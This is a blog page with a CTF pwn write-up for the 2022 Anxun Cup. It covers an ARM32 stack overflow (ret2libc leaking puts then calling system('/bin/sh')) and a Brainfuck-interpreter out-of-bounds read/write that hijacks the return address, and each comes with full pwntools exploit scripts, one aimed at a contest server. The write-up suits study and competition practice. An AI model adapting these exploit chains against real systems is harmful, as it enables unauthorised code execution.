@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>2022安洵杯 CTF PWN wp - Jsjsj</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="2022安洵杯 CTF PWN wp - Jsjsj" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="https://jsjsj.top/2022/10/03/2022%E5%AE%89%E6%B4%B5%E6%9D%AF%20CTF%20PWN%20wp/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2022-10-03T14:15:34.000Z" />
+  
+  <meta property="og:article:author" content="Mr. Jsjsj" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 7.0.0-rc2"></head>
+    <body
+        data-color-scheme="dark"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/projects">Projects</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/jsjsj1" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/pwn/">pwn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>October</span>
+            <span>3,</span>
+            <span>2022</span>
+        </div>
+        
+
+        <h2 class="title">2022安洵杯 CTF PWN wp</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="2022安洵杯-CTF-PWN-wp"><a href="#2022安洵杯-CTF-PWN-wp" class="headerlink" title="2022安洵杯 CTF PWN wp"></a>2022安洵杯 CTF PWN wp</h1><p>##前言：上午在打别的比赛，题不难，下午三点才上的号，导致我们差一名进决赛，太可惜了（都怪我  呜呜呜，下次认真。</p>
+<p>##babyarm：<br>思路：栈溢出，异构PWN，arm，retlibc2，一次retlibc泄露got表计算出libc基地址，第二次打system即可，找到gadget传参即可，由于题目是arm32位，前4个参数是用r0~r3寄存器传参，所以我们第一步泄露libc的话，需要找到pop r0，然后再找一个有blx的寄存器进行跳转即可，参考kot师傅的寄存器，采用了以下<br>pop{r4,r5,r6,r7,r8,sb,sl,pc}   pop{r3,pc}  mov r0,r7;blx r3<br>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>,<span class="string">&#x27;./chall&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=<span class="number">0x0104AC</span></span><br><span class="line">mainaddr=<span class="number">0x10C4C</span></span><br><span class="line"><span class="comment">#ropper --files libc.2.27.so search &quot;pop|mov&quot;</span></span><br><span class="line"><span class="comment">#pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span></span><br><span class="line"><span class="comment"># pop &#123;r3, pc&#125;</span></span><br><span class="line"><span class="comment">#mov r0, r7; blx r3</span></span><br><span class="line">popr1=<span class="number">0x00010cb0</span>   </span><br><span class="line">popr3=<span class="number">0x00010464</span></span><br><span class="line">movr0=<span class="number">0x00010ca0</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;msg&gt;&quot;</span>,<span class="string">&quot;s1mpl3Dec0d4r&quot;</span>)</span><br><span class="line"><span class="comment">#leak libc_bse</span></span><br><span class="line">rop1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2c</span>+p32(popr1)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(puts_got)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">rop1+=p32(puts_plt)+p32(movr0)+p32(mainaddr)*<span class="number">10</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;comment&gt;&quot;</span>,rop1)</span><br><span class="line">data = p.recvline()</span><br><span class="line">libc_base = u32(data[<span class="number">1</span>:<span class="number">5</span>]) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(data)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(binsh)</span><br><span class="line"><span class="comment">#attack ret addr-----&gt;system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">rop2=p32(popr1)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(binsh)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(popr2)</span><br><span class="line">rop2+=p32(system)+p32(movr0)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;msg&gt;&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x2c</span>+rop2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>##babybf:<br>此题是继qwnt做出的第二个Brainfuck解释器PWN题，它有一套自己的符号，类似于vm，也算一个vm题，通过移动指针来进行越界写和越界读，这题就是通过移动指针来越界读和越界写，来列举下breainfuckf</p>
+<pre><code>| Brainfuck | C                                                            |
+| --------- | ------------------------------------------------------------ |
+| &gt;         | ++ptr;                                                       |
+| &lt;         | --ptr;                                                       |
+| +         | ++*ptr;                                                      |
+| -         | --*ptr;                                                      |
+| .         | putchar(*ptr); |
+| ,         | *ptr =getch();                                               |
+| [         | while (*ptr) &#123;                                               |
+| ]         | &#125;                                                            |
+</code></pre>
+<p>通过&gt;移动87位置泄露libc，再次通过&gt;移动56次来劫持返回地址rop即可<br>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;47.108.29.107&#x27;</span>,<span class="number">10472</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/home/roo/Desktop/tools/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendcode</span>(<span class="params">length,code</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;len&gt; &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;code&gt; &quot;</span>,code)</span><br><span class="line"><span class="comment">#pay=&quot;&gt;&quot;</span></span><br><span class="line">pay=<span class="string">&quot;&gt;&quot;</span>*<span class="number">87</span></span><br><span class="line">pay+=<span class="string">&quot;&gt;.&quot;</span>*<span class="number">9</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sendcode(<span class="built_in">len</span>(pay),pay)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21b97</span>-<span class="number">0xf0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libcbase)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rce1=libcbase+<span class="number">0x10a2fc</span></span><br><span class="line">rce2=libcbase+<span class="number">0x4f322</span></span><br><span class="line">rce3=libcbase+<span class="number">0x10a38c</span></span><br><span class="line">poprdi=libcbase+<span class="number">0x000000000002164f</span></span><br><span class="line">poprsi=libcbase+<span class="number">0x0000000000023a6a</span></span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(rce1)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(rce1)</span><br><span class="line"><span class="comment"># rce_1=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_2=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_3=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_4=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_5=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_6=rce1&amp;0xff</span></span><br><span class="line"><span class="comment"># rce1=rce1&gt;&gt;8</span></span><br><span class="line"><span class="comment"># rce_7=rce1&amp;0xff</span></span><br><span class="line">pay2=<span class="string">&quot;-&quot;</span>*<span class="number">40</span></span><br><span class="line"><span class="comment">#pay2+=&quot;,&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sendcode(<span class="built_in">len</span>(pay2),pay2)</span><br><span class="line">pay3=<span class="string">&quot;&gt;&quot;</span>*<span class="number">56</span></span><br><span class="line">pay3+=<span class="string">&quot;,&gt;&quot;</span>*<span class="number">8</span></span><br><span class="line">pay3+=<span class="string">&quot;,&gt;&quot;</span>*<span class="number">8</span></span><br><span class="line">pay3+=<span class="string">&quot;,&gt;&quot;</span>*<span class="number">8</span></span><br><span class="line">pay3+=<span class="string">&quot;,&gt;&quot;</span>*<span class="number">8</span></span><br><span class="line">sendcode(<span class="built_in">len</span>(pay3),pay3)</span><br><span class="line">rop=p64(libcbase+<span class="number">0x000000000002155f</span>)+p64(binsh)+p64(system)</span><br><span class="line">p.send(p64(libcbase+<span class="number">0x00000000000008aa</span>))</span><br><span class="line">p.send(p64(libcbase+<span class="number">0x000000000002164f</span>))</span><br><span class="line">p.send(p64(binsh))</span><br><span class="line">p.send(p64(system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Mr. Jsjsj, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/pwn/" class="tag">#pwn</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2022/10/03/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">CTF Angr 符号执行学习（一）</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2022/10/03/%E9%9D%9E%E5%B8%B8%E8%A7%84PWN/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">非常规PWN</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="MrWillCom/MrWillCom.github.io" data-repo-id="MDEwOlJlcG9zaXRvcnkyODg5NTc5MTA=" data-category="Announcements" data-category-id="DIC_kwDOETkl1s4COQZm" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/projects" class="item">Projects</a>
+                
+                <a href="/resume" class="item">Resume</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/jsjsj1" class="item">GitHub</a>
+                
+                <a href="904815041@qq.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2023 Mr. Jsjsj<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+         
+        
+<script src="//code.tidio.co/6bkvqlfpdbtihnufei8yxpsvf98bq5gv.js"></script>
+ 
+        
+<script src="/js/tidio.js"></script>
+
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
